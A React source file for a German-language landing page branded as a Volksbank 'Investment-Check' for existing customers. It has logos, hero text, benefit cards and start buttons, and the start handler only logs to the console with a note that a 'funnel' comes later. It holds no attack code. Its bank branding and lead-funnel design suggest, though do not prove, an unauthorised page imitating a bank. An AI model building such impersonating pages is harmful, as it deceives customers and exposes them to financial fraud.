import { useEffect } from "react";
import { usePageMeta } from "@/hooks/use-page-meta";
import { CheckCircle2, ShieldCheck, Clock, TrendingUp } from "lucide-react";
import volksbankLogo from "@/assets/volksbank-logo.png";
import volksbankIcon from "@/assets/volksbank.png";
import heroImg from "@/assets/investmentcheck-hero.jpg";

const BLUE = "#196bc1";
const BLUE_DARK = "#0f4c8a";

const InvestmentCheck = () => {
  useEffect(() => { window.scrollTo(0, 0); }, []);
  usePageMeta("Volksbank Investment-Check für Bestandskunden", volksbankIcon);

  const handleStart = () => {
    // Funnel folgt später
    console.log("Investment-Check gestartet");
  };

  return (
    <div className="min-h-screen flex flex-col bg-white text-[#1a1a1a]">
      {/* Header */}
      <header style={{ backgroundColor: "#fff", borderBottom: "1px solid #e0e0e0" }}>
        <div className="max-w-[1200px] mx-auto flex items-center justify-between px-4 py-3">
          <img src={volksbankLogo} alt="Volksbank" className="h-10 md:h-14" />
          <span className="hidden sm:inline text-sm font-medium" style={{ color: BLUE }}>
            Investment-Check
          </span>
        </div>
      </header>

      {/* Hero */}
      <section className="relative overflow-hidden">
        <div className="max-w-[1200px] mx-auto px-4 py-10 md:py-16 grid md:grid-cols-2 gap-10 items-center">
          <div>
            <span
              className="inline-flex items-center gap-2 rounded-full px-3 py-1 text-xs font-semibold mb-5"
              style={{ backgroundColor: "#e8f1fb", color: BLUE }}
            >
              <ShieldCheck className="w-3.5 h-3.5" />
              Exklusiv für Volksbank Bestandskunden
            </span>
            <h1 className="text-3xl md:text-5xl font-bold leading-tight" style={{ color: BLUE_DARK }}>
              Der Volksbank Investment-Check für Bestandskunden
            </h1>
            <p className="mt-5 text-lg text-slate-700 leading-relaxed">
              Ihr persönlicher Anlage-Check — kostenlos und unverbindlich.
              Prüfen Sie in wenigen Minuten, ob Ihr Erspartes wirklich für Sie arbeitet
              und entdecken Sie neue Chancen für Ihre finanzielle Zukunft.
            </p>

            <div className="mt-8 flex flex-col sm:flex-row gap-3">
              <button
                onClick={handleStart}
                className="inline-flex items-center justify-center rounded px-8 py-4 text-base font-semibold text-white transition-all hover:brightness-110 active:brightness-95 shadow-md"
                style={{ backgroundColor: BLUE }}
              >
                Jetzt Investment-Check starten
              </button>
              <span className="text-sm text-slate-500 self-center">
                Dauer: ca. 3 Minuten • 100 % kostenlos
              </span>
            </div>

            <ul className="mt-6 space-y-2 text-sm text-slate-700">
              {[
                "Individuelle Auswertung Ihrer Anlagesituation",
                "Persönliche Empfehlungen von Ihren Volksbank-Experten",
                "Ohne Verpflichtung, jederzeit abbrechbar",
              ].map((t) => (
                <li key={t} className="flex items-start gap-2">
                  <CheckCircle2 className="w-4 h-4 mt-0.5 flex-shrink-0" style={{ color: BLUE }} />
                  <span>{t}</span>
                </li>
              ))}
            </ul>
          </div>

          <div className="relative">
            <div className="absolute inset-0 rounded-lg -z-10" style={{ backgroundColor: "#e8f1fb", transform: "translate(16px, 16px)" }} />
            <img
              src={heroImg}
              alt="Volksbank Investment Beratung"
              width={1024}
              height={1024}
              className="rounded-lg shadow-xl w-full h-auto object-cover"
            />
          </div>
        </div>
      </section>

      {/* Intro */}
      <section className="bg-slate-50 border-y border-slate-200">
        <div className="max-w-[1000px] mx-auto px-4 py-12 md:py-16 text-center">
          <h2 className="text-2xl md:text-3xl font-bold" style={{ color: BLUE_DARK }}>
            Wann haben Sie zuletzt Ihre Geldanlage überprüft?
          </h2>
          <p className="mt-4 text-slate-700 leading-relaxed md:text-lg">
            Zinssituation, Inflation und Märkte verändern sich laufend. Damit Ihr Vermögen
            optimal für Sie arbeitet, lohnt sich regelmäßig ein professioneller Blick auf
            Ihre Anlagen. Mit dem Volksbank Investment-Check erhalten Sie als Bestandskunde
            eine kostenlose Ersteinschätzung — persönlich, unabhängig und diskret.
          </p>
        </div>
      </section>

      {/* Benefits */}
      <section className="max-w-[1200px] mx-auto px-4 py-14 md:py-20">
        <div className="text-center max-w-2xl mx-auto mb-10">
          <h2 className="text-2xl md:text-3xl font-bold" style={{ color: BLUE_DARK }}>
            Ihre Vorteile auf einen Blick
          </h2>
          <p className="mt-3 text-slate-600">
            Warum sich der Check für Bestandskunden lohnt.
          </p>
        </div>

        <div className="grid grid-cols-1 md:grid-cols-3 gap-6">
          {[
            {
              icon: TrendingUp,
              title: "Individuelle Auswertung",
              text: "Wir analysieren Ihre aktuelle Anlagesituation und zeigen Ihnen konkrete Optimierungspotenziale.",
            },
            {
              icon: Clock,
              title: "In wenigen Minuten",
              text: "Der Check ist in etwa 3 Minuten erledigt. Kein Papierkram, keine Termine notwendig.",
            },
            {
              icon: ShieldCheck,
              title: "Exklusiv für Bestandskunden",
              text: "Als Volksbank-Kunde erhalten Sie den Check kostenlos und mit persönlicher Betreuung.",
            },
          ].map((b) => (
            <div
              key={b.title}
              className="rounded-lg border border-slate-200 bg-white p-6 hover:shadow-md transition-shadow"
            >
              <div
                className="flex items-center justify-center w-12 h-12 rounded-full mb-4"
                style={{ backgroundColor: "#e8f1fb" }}
              >
                <b.icon className="w-6 h-6" style={{ color: BLUE }} />
              </div>
              <h3 className="text-lg font-semibold mb-2" style={{ color: BLUE_DARK }}>
                {b.title}
              </h3>
              <p className="text-slate-600 text-sm leading-relaxed">{b.text}</p>
            </div>
          ))}
        </div>
      </section>

      {/* CTA Section */}
      <section className="py-14 md:py-20" style={{ backgroundColor: BLUE }}>
        <div className="max-w-[900px] mx-auto px-4 text-center text-white">
          <h2 className="text-2xl md:text-4xl font-bold">
            Starten Sie jetzt Ihren persönlichen Investment-Check
          </h2>
          <p className="mt-4 text-lg text-white/90">
            Kostenlos, unverbindlich und exklusiv für Volksbank-Bestandskunden.
          </p>
          <button
            onClick={handleStart}
            className="mt-8 inline-flex items-center justify-center rounded px-10 py-4 text-base font-semibold transition-all hover:brightness-95 shadow-lg"
            style={{ backgroundColor: "#fff", color: BLUE }}
          >
            Jetzt Investment-Check starten
          </button>
          <p className="mt-4 text-sm text-white/75">Dauer: ca. 3 Minuten</p>
        </div>
      </section>

      {/* Footer */}
      <footer className="bg-white border-t border-slate-200">
        <div className="max-w-[1200px] mx-auto px-4 py-6 flex flex-col sm:flex-row items-center justify-between gap-2 text-xs text-slate-500">
          <span>© {new Date().getFullYear()} Volksbank. Alle Rechte vorbehalten.</span>
          <span>Nur für Bestandskunden der Volksbank Österreich.</span>
        </div>
      </footer>
    </div>
  );
};

export default InvestmentCheck;
